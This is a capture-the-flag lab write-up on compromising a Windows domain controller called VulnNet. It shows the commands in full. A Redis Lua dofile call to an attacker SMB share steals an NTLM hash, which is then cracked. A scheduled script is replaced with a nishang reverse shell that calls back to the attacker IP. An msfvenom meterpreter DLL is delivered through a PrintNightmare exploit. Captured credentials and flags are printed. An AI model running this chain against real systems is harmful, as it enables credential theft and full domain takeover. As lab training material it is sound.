
# PORT SCAN
---

| PORT   | SERVICE      |
|--------|--------------|
| 53     | domain       |
| 135    | msrpc        |
| 139    | netbios-ssn  |
| 445    | microsoft-ds |
| 464    | kpasswd5     |
| 6379   | redis        |
| 9389   | mc-nmf       |



# RECONNAISSANCE
---

Let's add the dc and domain:

```bash
echo "10.10.32.0 VULNNET-BC3TCK1 vulnnet.local" | sudo tee -a /etc/hosts
```

We got `redis` running on the box, we can interact with it using `redis-cli`, we can install this with:

```
sudo apt install redis-tools
```

Now we can interact with Redis:

```
redis-cli -h 10.10.32.0 -p 6379
```

We can dump the info with `INFO`:

```BASH
10.10.32.0:6379> INFO
# Server
redis_version:2.8.2402
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:b2a45a9622ff23b7
redis_mode:standalone
os:Windows  
arch_bits:64
multiplexing_api:winsock_IOCP
process_id:2496
run_id:23002b13577f36e1fa8627469d0f171e9366182e
tcp_port:6379
uptime_in_seconds:1581
uptime_in_days:0
hz:10
lru_clock:7780931
config_file:

# Clients
connected_clients:4
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:1005144
used_memory_human:981.59K
used_memory_rss:971600
used_memory_peak:1005144
used_memory_peak_human:981.59K
used_memory_lua:36864
mem_fragmentation_ratio:0.97
mem_allocator:dlmalloc-2.8

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1752609814
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok

# Stats
total_connections_received:7
total_commands_processed:4
instantaneous_ops_per_sec:0
total_net_input_bytes:445
total_net_output_bytes:0
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0

# Replication
role:master
connected_slaves:0
master_repl_offset:0
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.09
used_cpu_user:0.08
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Keyspace
10.10.32.0:6379> 
```

Nothing too relevant, let's get the configuration:

```bash
10.10.32.0:6379> CONFIG GET *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "unixsocket"
  8) ""
  9) "logfile"
 10) ""
 11) "pidfile"
 12) "/var/run/redis.pid"
 13) "maxmemory"
 14) "0"
 15) "maxmemory-samples"
 16) "3"
 17) "timeout"
 18) "0"
 19) "tcp-keepalive"
 20) "0"
 21) "auto-aof-rewrite-percentage"
 22) "100"
 23) "auto-aof-rewrite-min-size"
 24) "67108864"
 25) "hash-max-ziplist-entries"
 26) "512"
 27) "hash-max-ziplist-value"
 28) "64"
 29) "list-max-ziplist-entries"
 30) "512"
 31) "list-max-ziplist-value"
 32) "64"
 33) "set-max-intset-entries"
 34) "512"
 35) "zset-max-ziplist-entries"
 36) "128"
 37) "zset-max-ziplist-value"
 38) "64"
 39) "hll-sparse-max-bytes"
 40) "3000"
 41) "lua-time-limit"
 42) "5000"
 43) "slowlog-log-slower-than"
 44) "10000"
 45) "latency-monitor-threshold"
 46) "0"
 47) "slowlog-max-len"
 48) "128"
 49) "port"
 50) "6379"
 51) "tcp-backlog"
 52) "511"
 53) "databases"
 54) "16"
 55) "repl-ping-slave-period"
 56) "10"
 57) "repl-timeout"
 58) "60"
 59) "repl-backlog-size"
 60) "1048576"
 61) "repl-backlog-ttl"
 62) "3600"
 63) "maxclients"
 64) "10000"
 65) "watchdog-period"
 66) "0"
 67) "slave-priority"
 68) "100"
 69) "min-slaves-to-write"
 70) "0"
 71) "min-slaves-max-lag"
 72) "10"
 73) "hz"
 74) "10"
 75) "repl-diskless-sync-delay"
 76) "5"
 77) "no-appendfsync-on-rewrite"
 78) "no"
 79) "slave-serve-stale-data"
 80) "yes"
 81) "slave-read-only"
 82) "yes"
 83) "stop-writes-on-bgsave-error"
 84) "yes"
 85) "daemonize"
 86) "no"
 87) "rdbcompression"
 88) "yes"
 89) "rdbchecksum"
 90) "yes"
 91) "activerehashing"
 92) "yes"
 93) "repl-disable-tcp-nodelay"
 94) "no"
 95) "repl-diskless-sync"
 96) "no"
 97) "aof-rewrite-incremental-fsync"
 98) "yes"
 99) "aof-load-truncated"
100) "yes"
101) "appendonly"
102) "no"
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
105) "maxmemory-policy"
106) "volatile-lru"
107) "appendfsync"
108) "everysec"
109) "save"
110) "jd 3600 jd 300 jd 60"
111) "loglevel"
112) "notice"
113) "client-output-buffer-limit"
114) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
115) "unixsocketperm"
116) "0"
117) "slaveof"
118) ""
119) "notify-keyspace-events"
120) ""
121) "bind"
122) ""
```

Important findings here are:

```
3) "requirepass"
4) ""
```

No password is set here, we logged in as Admin, we can also find the database file:

```bash
1) "dbfilename"
2) "dump.rdb"
```

Another finding is we can check the directory where this is running:

```bash
103) "dir"
104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
```

This runs as the `enterprise-security` user, Redis supports LUA scripting, in this case, we will perform a NTLM hash steal, as in previous machines, we usually uploaded a file generated with ntlm_theft which allows us to get the hash, for this case, it'll be easier as we only need a simple line of code, let's begin exploitation to check it up.


# EXPLOITATION
---

First of all, we need to set `responder` to capture the hash:

```
sudo responder -I tun0
```

Now, its time to get our hash, we will make use of lua scripting, we can find more info on Redis pentesting on this article:

https://exploit-notes.hdks.org/exploit/database/redis-pentesting/

Based on the article, we can use this:

```lua
# Read files and directories using Lua scripts
> eval "dofile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\user.txt')" 0
> eval "dofile('C:\\\\Users\\\\<username>\\\\Desktop\\\\user.txt')" 0
```

`dofile` allows us to read files and directories, but we can also use it to read an external resource, this will make a smb request which will try to load and execute the file allowing us to capture the ntlm hash of the user which makes the request, in this case `enterprise-security` since we know Redis runs as this user:

```lua
eval "dofile('//10.14.21.28/test')" 0
```

![Pasted image 20250715182515.png](../../IMAGES/Pasted%20image%2020250715182515.png)

If we check responder:

![Pasted image 20250715182534.png](../../IMAGES/Pasted%20image%2020250715182534.png)

There we go, we got the hash, time to use `hashcat`:

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

ENTERPRISE-SECURITY::VULNNET:dc78a6f36d13a21e:d0a6afac169aa07624538fff545e34c4:010100000000000080c019fae1f5db01f5f5ed5cde5554930000000002000800390037004100500001001e00570049004e002d00580049004b004c005400330037004f004d003800530004003400570049004e002d00580049004b004c005400330037004f004d00380053002e0039003700410050002e004c004f00430041004c000300140039003700410050002e004c004f00430041004c000500140039003700410050002e004c004f00430041004c000700080080c019fae1f5db01060004000200000008003000300000000000000000000000003000003ce5b632b2bc6c395f91f8d0b1db0032595e1461b9529c99c3417856caabe8d40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310034002e00320031002e00320038000000000000000000:sand_0873959498
```

![Pasted image 20250715182530.png](../../IMAGES/Pasted%20image%2020250715182530.png)

Ok, we got our initial credentials 

```
enterprise-security:sand_0873959498
```

Let's check the shares using `netexec`:

```python
nxc smb 10.10.32.0 -u 'enterprise-security' -p 'sand_0873959498' --shares

MB         10.10.32.0      445    VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
SMB         10.10.32.0      445    VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498
SMB         10.10.32.0      445    VULNNET-BC3TCK1  [*] Enumerated shares
SMB         10.10.32.0      445    VULNNET-BC3TCK1  Share           Permissions     Remark
SMB         10.10.32.0      445    VULNNET-BC3TCK1  -----           -----------     ------
SMB         10.10.32.0      445    VULNNET-BC3TCK1  ADMIN$                          Remote Admin
SMB         10.10.32.0      445    VULNNET-BC3TCK1  C$                              Default share
SMB         10.10.32.0      445    VULNNET-BC3TCK1  Enterprise-Share READ,WRITE     
SMB         10.10.32.0      445    VULNNET-BC3TCK1  IPC$            READ            Remote IPC
SMB         10.10.32.0      445    VULNNET-BC3TCK1  NETLOGON        READ            Logon server share
SMB         10.10.32.0      445    VULNNET-BC3TCK1  SYSVOL          READ            Logon server share
```

We got the `Enterprise-Share` on here, let's check it up:

```
smbclient \\\\10.10.228.252\\Enterprise-Share -U 'enterprise-security'
Password for [WORKGROUP\enterprise-security]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb 23 17:45:41 2021
  ..                                  D        0  Tue Feb 23 17:45:41 2021
  PurgeIrrelevantData_1826.ps1        A       69  Tue Feb 23 19:33:18 2021
```

Disclaimer: (At this point my pc restarted and I lost the previous machine, we'll proceed with this IP).

As seen, we got a `.ps1` script, let's take a look at it:

```powershell
cat PurgeIrrelevantData_1826.ps1
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

The script basically does a cleanup of `Public/Documents`, this seems to be some sort of scheduled task, if we're right about this, we can replace this script with a reverse shell one and get a connection back, we can use [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell with a little alteration on bottom:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.14.21.28 -Port 4444
```

Should look like this:

![Pasted image 20250715182544.png](Pasted%20image%2020250715182544.png)

We need to save it with the same name as the cleanup script and upload it:

```bash
smb: \> put PurgeIrrelevantData_1826.ps1
putting file PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (1.2 kb/s) (average 1.2 kb/s)
smb: \> 
```

Once we put the script, we need to start our listener, after a couple seconds, we see the connection:

![Pasted image 20250715182549.png](../../IMAGES/Pasted%20image%2020250715182549.png)

We got our first shell, let's begin privilege escalation.

# PRIVILEGE ESCALATION
---

Time to begin our privilege escalation, for some reason, winPEAS didn't work on this shell, so, we gotta do it manually, let's get the processes first:

```powershell
PS C:\Users\enterprise-security\Downloads> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
    153      10    16296      12616              3196   0 amazon-ssm-agent                                             
     76       5     2680       1704       0.09   3796   0 cmd                                                          
     80       5      856         76              1164   0 CompatTelRunner                                              
     83       5      856       3780              3132   0 CompatTelRunner                                              
    152       9     6612      12568              2168   0 conhost                                                      
    148       9     7360       7864       0.33   3788   0 conhost                                                      
    147       9     6612       3352       0.03   3832   0 conhost                                                      
    152       9     6596      12508              4036   0 conhost                                                      
    154       9     6596       1284              4092   0 conhost                                                      
    383      15     2328       3888               388   0 csrss                                                        
    163       9     1648       3224               464   1 csrss                                                        
    385      32    15504      17736              2292   0 dfsrs                                                        
    182      12     2384       5608              2284   0 dfssvc                                                       
    339      28     7700       4444              2380   0 dns                                                          
    537      22    16856      25336               944   1 dwm                                                          
     49       6     1416       1672               648   0 fontdrvhost                                                  
     49       6     1648       1992              1876   1 fontdrvhost                                                  
      0       0       56          8                 0   0 Idle                                                         
    467      25    11196      43304              3428   1 LogonUI                                                      
   1511     156    42640      42364               620   0 lsass                                                        
    551      30    34756       8148              2260   0 Microsoft.ActiveDirectory.WebServices                        
    222      13     2928      10128               868   0 msdtc                                                        
    129       8     2032       1804              1516   0 nssm                                                         
    129       8     2028       2040       0.03   3516   0 nssm                                                         
    860      35    72688      61608       1.75   3320   0 powershell                                                   
    142      12    22176       5792       0.17   3860   0 redis-server                                                 
      0      24     2780      90212                84   0 Registry                                                     
    449      16     5144      13468               600   0 services                                                     
     53       3      500        412               276   0 smss                                                         
    466      23     5952      13252              1888   0 spoolsv                                                      
    159      10     1904       6548              3568   0 SppExtComObj                                                 
    229      11     5680      14040              2436   0 sppsvc                                                       
    176      11    17160      17492              3048   0 ssm-agent-worker                                             
    547      18    14440      13208               296   0 svchost                                                      
    416      26     9036      13568               308   0 svchost                                                      
    596      18     4960       9196               808   0 svchost                                                      
    622      19     3532       9764               860   0 svchost                                                      
    215      12     1752       3864               908   0 svchost                                                      
    544      28     7516      23448               936   0 svchost                                                      
   1666      63    32316      47044               984   0 svchost                                                      
    502      18     4128       4488               996   0 svchost                                                      
    805      48     9008      13644              1124   0 svchost                                                      
    397      32    10348      13280              1236   0 svchost                                                      
    309      11     1988       3932              1364   0 svchost                                                      
    161       8     1368       4892              1620   0 svchost                                                      
    183      12     3820      12984              1820   0 svchost                                                      
    201      10     2216       7256              2000   0 svchost                                                      
    162      10     2008       6568              2020   0 svchost                                                      
    182       9     5368       5744              2092   0 svchost                                                      
    498      22    18532      24596              2136   0 svchost                                                      
    130       7     1656       6400              4088   0 svchost                                                      
   1403       0      192        144                 4   0 System                                                       
    170      52    72080      52996              1344   0 TiWorker                                                     
    138       8     1912       7176               616   0 TrustedInstaller                                             
    241      16     2708       7212              2668   0 vds                                                          
    172      11     1484       6828               528   0 wininit                                                      
    240      12     2604      14972               512   1 winlogon                                                     
     54       4      720       1032              2268   0 wlms                                                         
    235      13     4748      13308              2968   0 WmiPrvSE                                                     
    177      10     8064      13024              3056   0 WmiPrvSE
```

`spoolsv` is running, which means that the print spooler service must be on here, based on previous machines, this service could be vulnerable to PrintNightmare, let's check the services then:

```
PS C:\Users\enterprise-security\Downloads> Get-Service | Where-Object {$_.Status -eq 'Running'}

Status   Name               DisplayName                           
------   ----               -----------                           
Running  ADWS               Active Directory Web Services         
Running  AmazonSSMAgent     Amazon SSM Agent                      
Running  BFE                Base Filtering Engine                 
Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
Running  CDPSvc             Connected Devices Platform Service    
Running  CertPropSvc        Certificate Propagation               
Running  ClipSVC            Client License Service (ClipSVC)      
Running  CoreMessagingRe... CoreMessaging                         
Running  CryptSvc           Cryptographic Services                
Running  DcomLaunch         DCOM Server Process Launcher          
Running  Dfs                DFS Namespace                         
Running  DFSR               DFS Replication                       
Running  Dhcp               DHCP Client                           
Running  DiagTrack          Connected User Experiences and Tele...
Running  DNS                DNS Server                            
Running  Dnscache           DNS Client                            
Running  DPS                Diagnostic Policy Service             
Running  DsmSvc             Device Setup Manager                  
Running  DsSvc              Data Sharing Service                  
Running  EventLog           Windows Event Log                     
Running  EventSystem        COM+ Event System                     
Running  FontCache          Windows Font Cache Service            
Running  gpsvc              Group Policy Client                   
Running  iphlpsvc           IP Helper                             
Running  Kdc                Kerberos Key Distribution Center      
Running  KeyIso             CNG Key Isolation                     
Running  LanmanServer       Server                                
Running  LanmanWorkstation  Workstation                           
Running  LicenseManager     Windows License Manager Service       
Running  lmhosts            TCP/IP NetBIOS Helper                 
Running  LSM                Local Session Manager                 
Running  mpssvc             Windows Defender Firewall             
Running  MSDTC              Distributed Transaction Coordinator   
Running  NcbService         Network Connection Broker             
Running  Netlogon           Netlogon                              
Running  netprofm           Network List Service                  
Running  NlaSvc             Network Location Awareness            
Running  nsi                Network Store Interface Service       
Running  PlugPlay           Plug and Play                         
Running  PolicyAgent        IPsec Policy Agent                    
Running  Power              Power                                 
Running  ProfSvc            User Profile Service                  
Running  Redis              Redis                                 
Running  RpcEptMapper       RPC Endpoint Mapper                   
Running  RpcSs              Remote Procedure Call (RPC)           
Running  RunScript          RunScript                             
Running  SamSs              Security Accounts Manager             
Running  Schedule           Task Scheduler                        
Running  SENS               System Event Notification Service     
Running  SessionEnv         Remote Desktop Configuration          
Running  ShellHWDetection   Shell Hardware Detection              
Running  Spooler            Print Spooler                         
Running  sppsvc             Software Protection                   
Running  StateRepository    State Repository Service              
Running  SysMain            SysMain                               
Running  SystemEventsBroker System Events Broker                  
Running  TermService        Remote Desktop Services               
Running  Themes             Themes                                
Running  TimeBrokerSvc      Time Broker                           
Running  TokenBroker        Web Account Manager                   
Running  UALSVC             User Access Logging Service           
Running  UmRdpService       Remote Desktop Services UserMode Po...
Running  UserManager        User Manager                          
Running  UsoSvc             Update Orchestrator Service           
Running  vds                Virtual Disk                          
Running  W32Time            Windows Time                          
Running  Wcmsvc             Windows Connection Manager            
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Running  Winmgmt            Windows Management Instrumentation    
Running  WinRM              Windows Remote Management (WS-Manag...
Running  wlidsvc            Microsoft Account Sign-in Assistant   
Running  WLMS               Windows Licensing Monitoring Service  
Running  WpnService         Windows Push Notifications System S...
Running  wuauserv           Windows Update
```

There it is:

```
Running  Spooler            Print Spooler
```

We check `Print Spooler`, we are indeed facing `PrintNightmare`, you can check more info on this vulnerability on here:

https://www.exploit-db.com/docs/50537

Let's check the PoC:

![Pasted image 20250715182601.png](../../IMAGES/Pasted%20image%2020250715182601.png)

![Pasted image 20250715182604.png](../../IMAGES/Pasted%20image%2020250715182604.png)

![Pasted image 20250715182618.png](../../IMAGES/Pasted%20image%2020250715182618.png)

Let's reproduce the steps, first, we need to grab the GitHub script:

```
https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527
```

Now, its time to do the evil dll:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.21.28 LPORT-9001 -f dll -o evil.dll
```

Now, we need to use `smbserver.py` to host the dll:

```python
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Time to start Metasploit to use `multi/handler`:

```
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 9001
run
```

And finally, its time to use our exploit, let's do it:

```python
python3 CVE-2021-34527.py vulnnet.local/enterprise-security:"sand_0873959498"@10.10.228.252 '\\10.14.21.28\share\evil.dll'
```

![Pasted image 20250715182627.png](../../IMAGES/Pasted%20image%2020250715182627.png)

We got our shell:

![Pasted image 20250715182631.png](../../IMAGES/Pasted%20image%2020250715182631.png)

We can get both flags and end the CTF:

```
C:\Windows\system32>type C:\Users\enterprise-security\Desktop\user.txt

THM{3eb176aee96432d5b100bc93580b291e}

C:\Windows\system32>type C:\Users\Administrator\Desktop\system.txt

THM{d540c0645975900e5bb9167aa431fc9b}

```

![Pasted image 20250715182637.png](Pasted%20image%2020250715182637.png)


